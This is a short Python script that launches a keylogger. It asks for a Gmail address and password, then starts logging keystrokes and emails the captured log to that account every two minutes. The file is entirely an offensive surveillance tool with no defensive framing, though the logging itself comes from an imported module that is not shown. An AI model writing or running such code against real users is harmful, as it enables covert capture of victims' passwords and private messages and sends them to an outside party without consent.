#!/usr/bin/python
import keylogger
#user input for google email and password.
email_address = input(str("Enter a gmail account: "))
email_password = input(str("Enter password: "))
#keylogger that uses email and password entered then sends a log of keystrokes every 2 minutes
my_keylogger = keylogger.Keylogger(email=email_address, password=email_password, time_interval=120)
my_keylogger.start_logging()